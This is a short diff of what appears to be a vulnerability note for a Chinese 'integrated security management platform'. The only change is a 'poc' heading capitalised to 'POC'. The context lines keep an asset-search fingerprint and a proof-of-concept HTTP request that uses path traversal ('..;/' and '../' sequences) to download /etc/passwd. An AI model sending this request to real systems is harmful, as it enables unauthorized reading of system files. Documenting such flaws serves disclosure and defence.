@@ -8,7 +8,7 @@
 title="综合安防管理平台"
 ```
 
-## poc
+## POC
 
 ```
 GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
